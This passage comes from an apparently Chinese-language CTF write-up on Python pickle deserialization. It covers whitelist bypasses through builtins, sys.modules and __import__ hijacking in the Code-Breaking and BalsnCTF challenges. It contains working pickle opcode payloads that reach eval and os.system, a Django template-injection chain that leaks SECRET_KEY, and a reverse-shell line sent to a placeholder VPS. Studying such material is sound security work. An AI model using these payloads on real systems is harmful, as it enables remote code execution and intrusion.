&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 用pker.py生成payload&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后&lt;code>base64.b64encode(data)&lt;/code>加进&lt;code>session['info']&lt;/code>中拿到shell&lt;/p>
&lt;p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入builtins模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>builtins&lt;/code>模块&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>更多知识参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | [Python 的内建对象](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，docker地址-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了&lt;/p>
&lt;p>审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app&lt;/p>
&lt;p>看core下的settings.py比默认的配置多了54和55行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
&lt;p>用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>依旧是重写了&lt;code>find_class()&lt;/code>方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链&lt;/p>
&lt;p>（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>，注册一个名为这个的用户即可获得签名的密钥。&lt;/p>
&lt;p>再掉头回去思考opcode的编写。重写&lt;code>find_class()&lt;/code>之后限制很多，但通过builtins仍然可以用&lt;code>getattr()&lt;/code>；那么就分两步走，先通过&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>来获取&lt;code>eval()&lt;/code>，再执行代码。那么如何手写protocol=0的opcode捏？&lt;/p>
&lt;p>首先引入模块builtins和函数getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后需要获取当前的上下文，用globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>globals是个字典，所以还要获取dict这个对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>还要执行globals()获取完整上下文&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>栈顶元素是builtins.globals，压入一个空元组&lt;code>(t&lt;/code>，然后用&lt;code>R&lt;/code>执行&lt;/p>
&lt;p>然后用dict.get()方法从globals的字典中拿到键名为builtions的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>反序列化后得到builtins对象&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>；之后再用getattr从builtins对象中取出eval，也就是再套一层娃&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>现在已经拿到了eval对象，再执行代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入sys模块名字中不带点号">&amp;ndash;&amp;raquo;仅可以引入&lt;code>sys&lt;/code>模块&amp;amp;名字中不带&lt;code>.&lt;/code>点号&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
&lt;p>审计一下源码，先看一下肯定会不secure的securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>重写&lt;code>find_class()&lt;/code>，被调用时可以灵活添加白名单；再看看server.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>将输入的内容先转为ascii码形式被b64加密，再反序列化出来；其中白名单是sys模块&lt;/p>
&lt;p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃&lt;code>sys.modules['sys']=sys.modules&lt;/code>。那么如果我们先从sys中引入modules: &lt;code>import modules from sys&lt;/code>，然后将&lt;code>modules['sys']&lt;/code>改为&lt;code>modules['os']&lt;/code>就将成功引入os模块。&lt;/p>
&lt;p>但有个缺陷是modules为dict，需要用&lt;code>getattr(sys.modules[module], name)&lt;/code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('dir')
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入题目中自设空模块">&amp;ndash;&amp;raquo;仅可以引入题目中自设空模块&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>稍有区别，在&lt;code>getattr()&lt;/code>之前先用了&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>这次的白名单是&lt;code>structs&lt;/code>，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>是所有模块公有的字典，记录所有的内建函数，可以通过对&lt;code>__builtins__&lt;/code>内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。&lt;/p>
&lt;p>我们知道，&lt;code>__getattribute__&lt;/code>魔术方法可以访问任意属性。而同时&lt;code>__import__&lt;/code>并不是铁板一块，它的全部参数是&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>，它可以被替换（通过导入builtins模块并赋值给&lt;code>builtins.__import__&lt;/code>）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了&lt;code>__import__&lt;/code>，现在我们可以劫持这个__import__，让它变为&lt;code>__getattribute__&lt;/code>，让我们引入的structs变为&lt;code>structs.__getattribute__(structs).xxx&lt;/code>。&lt;/p>
&lt;p>对于引入模块的检查只会出现在b&amp;rsquo;c&amp;rsquo;时，所以我们在用&lt;code>S&lt;/code>操作码劫持&lt;code>__import__&lt;/code>时并不会引发find_class()的过滤。&lt;/p>
&lt;p>然而我们不能直接getattr()=getattr()这样覆盖&lt;code>__import__&lt;/code>，我们还需要&lt;code>__dict__&lt;/code>的帮忙。&lt;code>__dict__&lt;/code>是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。&lt;/p>
&lt;p>所以整合一下上面的思路：我们先要引入助手list&lt;code>structs.__dict__&lt;/code>，取出structs空模块的内建函数（一个待取的dict）&lt;code>structs.__builtins__&lt;/code>和我们需要的魔术方法&lt;code>structs.__getattribute__&lt;/code>。之后从内建函数&lt;code>structs.__builtins__&lt;/code>中将键名为&lt;code>__import__&lt;/code>的值替换为&lt;code>structs.__getattribute__&lt;/code>，然后借助&lt;code>__dict__&lt;/code>将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b&amp;rsquo;c&amp;rsquo;从structs中引入get时触发find_class()中的&lt;code>__import__&lt;/code>，也就相当于在执行&lt;code>structs.__getattribute__('structs').get&lt;/code>，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数&lt;code>__builtins__&lt;/code>，所以利用这个得到的get方法就可以从&lt;code>__builtins__&lt;/code>中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。&lt;/p>
&lt;p>pker&lt;/p>
